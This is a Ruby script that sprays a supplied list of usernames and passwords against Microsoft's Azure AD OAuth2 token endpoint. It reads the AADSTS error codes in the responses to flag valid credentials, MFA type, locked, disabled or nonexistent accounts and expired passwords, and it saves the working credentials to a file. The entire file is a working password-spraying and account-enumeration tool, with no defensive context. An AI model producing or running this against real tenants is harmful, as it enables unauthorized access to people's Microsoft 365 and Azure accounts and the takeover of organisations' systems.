['faraday','erb','json','colorize'].each(&method(:require))




if ARGV[0] != '-h' then
	userfile = File.open(ARGV[0])
	users = userfile.readlines.map(&:chomp)
	userfile.close

	passfile = File.open(ARGV[1])
	passwords = passfile.readlines.map(&:chomp)
	passfile.close

	
	puts "Username\t\t\tPassword\n----\t\t\t\t----"
	con = Faraday.new
	valid = []
	users.each do |user|
		passwords.each do |psword|
			print "#{user}\t\t\t#{psword}\r".colorize(:blue)
			resp = Faraday.post('https://login.microsoft.com/common/oauth2/token') do |req|
				req.body = "resource=https://graph.windows.net&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&client_info=1&scope=openid&username=#{ERB::Util.url_encode(user)}&password=#{ERB::Util.url_encode(psword)}&grant_type=password"
				req.headers['Accept'] = 'application/json'
				req.headers['Content-Type'] =  'application/x-www-form-urlencoded'
			end
			print "                                                                                        \r"
			if resp.status === 200 then 
				puts "[RESULT] Valid account detected: #{user} - #{psword}".colorize(:green)
				valid.append("#{user} - #{psword} - No MFA")
			elsif  resp.body.include? "AADSTS50126" then
				next
			elsif  resp.body.include? "AADSTS50128" or resp.body.include? "AADSTS50059" then
				puts "[WARNING] Tenant for account #{user} does not exist.".colorize(:red)
			elsif  resp.body.include? "AADSTS50034" then
				puts "[WARNING] #{user} does not exist.".colorize(:red)
			elsif  resp.body.include? "AADSTS50079" or resp.body.include? "AADSTS50076" then
				puts "[RESULT] Valid account detected (Microsoft MFA in use): #{user} - #{psword}".colorize(:yellow)
				valid.append("#{user} - #{psword} - Microsoft MFA")
			elsif  resp.body.include? "AADSTS50158" then
				puts "[RESULT] Valid account detected (DUO MFA in use): #{user} - #{psword}".colorize(:yellow)
				valid.append("#{user} - #{psword} - DUO MFA")
			elsif  resp.body.include? "AADSTS50053" then
				puts "[WARNING] Account locked: #{user}".colorize(:red)
			elsif  resp.body.include? "AADSTS50057" then
				puts "[WARNING] Account disabled: #{user}".colorize(:red)
			elsif  resp.body.include? "AADSTS50055" then
				puts "[RESULT] Valid account detected (Password Expired): #{user} - #{psword}".colorize(:yellow)
				valid.append("#{user} - #{psword} - Expired Password") 
			else
				puts "[WARNING] Unknown error detected: #{user}".colorize(:red)
			end
		end
	end
	File.open("results.txt", "w+") do |f|
  		valid.each { |element| f.puts(element) }
	end
else
	puts 'Pass a list of usernames and passwords to check. --> ruby AzureVUE.rb [emails.txt] [passwords.txt]'
end